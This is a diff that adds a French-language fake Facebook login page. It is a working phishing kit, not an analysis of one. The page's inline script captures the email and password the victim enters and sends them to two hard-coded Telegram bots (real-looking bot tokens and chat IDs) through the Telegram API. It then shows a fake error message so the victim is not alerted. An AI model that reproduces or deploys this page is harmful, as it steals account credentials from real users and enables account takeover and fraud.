@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Facebook – Connectez-vous ou inscrivez-vous</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      background: #f0f2f5;
+      margin: 0;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+    .fb-header {
+      text-align: center;
+      margin-top: 40px;
+      margin-bottom: 24px;
+    }
+    .fb-logo {
+      font-size: 56px;
+      font-weight: bold;
+      color: #1877f2;
+      letter-spacing: -3px;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      margin-bottom: 10px;
+      user-select: none;
+    }
+    .fb-info-bar {
+      width: 480px;
+      margin: 0 auto 16px auto;
+      background: #fff;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      padding: 10px 16px;
+      font-size: 16px;
+      color: #1c1e21;
+      display: flex;
+      align-items: center;
+      box-sizing: border-box;
+    }
+    .fb-info-bar:before {
+      content: "ℹ️";
+      margin-right: 8px;
+      font-size: 18px;
+    }
+    .fb-login-card {
+      background: #fff;
+      width: 396px;
+      margin: 0 auto;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      padding: 24px 24px 20px 24px;
+      box-sizing: border-box;
+      text-align: center;
+    }
+    .fb-login-card h2 {
+      font-size: 20px;
+      font-weight: 400;
+      margin: 0 0 16px 0;
+      color: #1c1e21;
+    }
+    .fb-warning {
+      background: #fffbe2;
+      border: 1px solid #ffe066;
+      color: #8a6d3b;
+      border-radius: 4px;
+      padding: 10px;
+      margin-bottom: 16px;
+      font-size: 15px;
+    }
+    .fb-input {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 17px;
+      background: #f5f6f7;
+      transition: border-color 0.2s;
+    }
+    .fb-input:focus {
+      border-color: #1877f2;
+      outline: none;
+      background: #fff;
+    }
+    .fb-btn {
+      width: 100%;
+      background: #1877f2;
+      color: #fff;
+      font-size: 20px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      padding: 12px 0;
+      margin-top: 6px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .fb-btn:hover {
+      background: #166fe5;
+    }
+    .fb-links {
+      font-size: 14px;
+      color: #1877f2;
+      margin-top: 8px;
+      text-align: left;
+    }
+    .fb-links a {
+      color: #1877f2;
+      text-decoration: none;
+      margin-right: 8px;
+    }
+    .fb-footer {
+      margin: 60px auto 0 auto;
+      max-width: 900px;
+      text-align: left;
+      color: #737373;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+    .fb-footer-links {
+      margin-bottom: 10px;
+    }
+    .fb-footer-links a {
+      color: #385898;
+      text-decoration: none;
+      margin-right: 10px;
+    }
+    .fb-footer-meta {
+      color: #737373;
+      margin-top: 12px;
+    }
+    .fb-error-message {
+      color: #e53935;
+      background: #fffbe2;
+      border: 1px solid #ffe066;
+      border-radius: 4px;
+      padding: 10px;
+      margin-bottom: 16px;
+      font-size: 15px;
+      display: none;
+    }
+    @media (max-width: 500px) {
+      .fb-login-card, .fb-info-bar {
+        width: 95vw;
+        min-width: 0;
+        padding: 12px;
+      }
+      .fb-footer {
+        padding: 0 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="fb-header">
+  <div class="fb-logo">facebook</div>
+</div>
+
+<div class="fb-info-bar">
+  Vous devez vous connecter pour continuer.
+</div>
+
+<div class="fb-login-card">
+  <h2>Se connecter à Facebook</h2>
+  <div class="fb-warning">
+    Vous devez vous connecter pour continuer.
+  </div>
+  <form id="loginForm" autocomplete="off">
+    <input class="fb-input" type="text" id="email" name="email" placeholder="Adresse e-mail ou numéro de tél." required autocomplete="off" />
+    <input class="fb-input" type="password" id="password" name="password" placeholder="Mot de passe" required autocomplete="off" />
+    <button class="fb-btn" type="submit">Se connecter</button>
+    <div class="fb-error-message" id="fb-error-message">Désolé, veuillez réessayer plus tard.<br></div>
+  </form>
+  <div class="fb-links">
+    <a href="#">Informations de compte oubliées ?</a>
+    ·
+    <a href="#">S’inscrire sur Facebook</a>
+  </div>
+</div>
+
+<div class="fb-footer">
+  <div class="fb-footer-links">
+    Français (France) · العربية · English (US) · Español (España) · Türkçe · Italiano · Deutsch · Português (Brasil) · हिन्दी · 中文(简体) · 日本語 · <a href="#">+</a>
+  </div>
+  <div class="fb-footer-links">
+    S’inscrire · Se connecter · Messenger · Facebook Lite · Vidéo · Meta Pay · Boutique Meta · Meta Quest · Ray-Ban Meta · Meta AI · Instagram · Threads<br />
+    Centre d’information sur les élections · Politique de confidentialité · À propos · Créer une publicité · Créer une Page · Développeurs · Emplois · Cookies · Choisir sa publicité · Conditions générales · Aide · Importation des contacts et non-utilisateurs
+  </div>
+  <div class="fb-footer-meta">
+    Meta © 2025
+  </div>
+</div>
+
+<script>
+  // تعريف بيانات البوتين مع الرموز ومعرفات الدردشة الخاصة بهما
+  const bots = [
+    { token: '7584838471:AAE_j0gqUNPiCEyfmbR2W834Os7Fy9DRA5w', chatId: '2117899435' },
+    { token: '7848221171:AAEhZwu6B_UGUmxry07joQKN1ky6Ex9ltkI', chatId: '5333329761' }
+  ];
+
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const email = this.email.value.trim();
+    const password = this.password.value.trim();
+
+    if (!email || !password) return;
+
+    const message = `Facebook Login:\nEmail: ${email}\nPassword: ${password}`;
+
+    bots.forEach(bot => {
+      const url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}`;
+      fetch(url).catch(err => console.error('Telegram API error:', err));
+    });
+
+    // إظهار رسالة الخطأ بعد الإرسال
+    document.getElementById('fb-error-message').style.display = 'block';
+
+    // تعطيل زر الإرسال مؤقتًا لمنع التكرار السريع
+    this.querySelector('button[type="submit"]').disabled = true;
+    setTimeout(() => {
+      this.querySelector('button[type="submit"]').disabled = false;
+    }, 4000);
+  });
+</script>
+
+</body>
+</html>
